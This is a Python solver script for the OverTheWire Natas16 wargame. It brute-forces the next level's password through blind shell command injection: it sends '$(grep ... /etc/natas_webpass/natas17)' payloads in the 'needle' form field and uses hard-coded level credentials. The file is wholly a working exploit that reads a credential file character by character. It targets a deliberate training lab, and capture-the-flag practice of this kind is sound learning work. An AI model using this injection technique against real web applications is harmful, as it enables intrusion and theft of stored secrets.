#!/usr/bin/python3

# Natas16 - blind grep injection

import time

import requests
from string import ascii_lowercase
from string import ascii_uppercase


# special_characters = "~!@#$%^&*()_+`-=,./;'[]\\<>?:\"{}|"
numbers = "0123456789"

# most likely like a MD5 hash 32 characters
characters_set = numbers + ascii_lowercase + ascii_uppercase


def format_timer(seconds):
    sign_string = '-' if seconds < 0 else ''
    seconds = abs(int(seconds))
    days, seconds = divmod(seconds, 86400)
    hours, seconds = divmod(seconds, 3600)
    minutes, seconds = divmod(seconds, 60)
    if days > 0:
        return '%s %dd %dh %dm %ds' % (sign_string, days, hours, minutes, seconds)
    elif hours > 0:
        return '%s %dh %dm %ds' % (sign_string, hours, minutes, seconds)
    elif minutes > 0:
        return '%s %dm %ds' % (sign_string, minutes, seconds)
    else:
        return '%s %ds' % (sign_string, seconds)

def reduce_character_set(character_set):
    reduced_character_set = ""
    rcs_action_name = "*  Reduce character set.  *"
    print("\n{1}\n{0}\n{1}\n\n[ETA < 1m] Checking to see which characters are the password.".format(
        rcs_action_name,
        "*" * len(rcs_action_name)
    ))
    for character in character_set:
        user_data = {'needle': '$(grep {0} /etc/natas_webpass/natas17)exists'.format(character)}
        request = requests.post('http://natas16.natas.labs.overthewire.org/index.php',
                                auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=user_data)
        if 'exists' not in request.text:
            character = character[-1:]  # remove escape
            reduced_character_set = reduced_character_set + character
    return reduced_character_set

def find_password(password_character_set):
    part_password = ""

    password_search_action_name = "*  Password Search.  *"
    print("\n{1}\n{0}\n{1}\n\n[ETA 5m] Testing characters one by one.\n".format(
        password_search_action_name,
        "*" * len(password_search_action_name)
    ))

    part_password = ""
    for i in range(32):
        for character in password_character_set:  # Change this to test multi queries at a time to speed this up.
            user_data = {'needle': '$(grep ^{0}{1} /etc/natas_webpass/natas17)exists'.format(part_password, character)}
            request = requests.post('http://natas16.natas.labs.overthewire.org/index.php',
                                    auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'), data=user_data)

            if 'exists' not in request.text:
                part_password = part_password + character
                print("Confirmed password characters: {0}".format(part_password))
                break
            if character == password_character_set[-1:]:
                print("Not found.")
                return None
    return part_password

def main():
    t0 = time.time()  # Start timing
    new_character_set = reduce_character_set(characters_set)
    t1 = time.time()  # reduce character set done, starting password search.
    print("[Reduce character set - completed in:{0}] Confirmed new characters set. "
      "The following characters are found in password: {1}".format(format_timer(t1 - t0), new_character_set))
    password = find_password(new_character_set)
    if password:
        t2 = time.time()  # End timer the search for the password is complete.
        print(
            "[Password search - completed in:{0}] Success, the password is: {1}\n".format(format_timer(t2 - t1), password))
        print("Total Time Taken:{0}".format(format_timer(t2 - t0)))

if __name__ == "__main__":
    main()
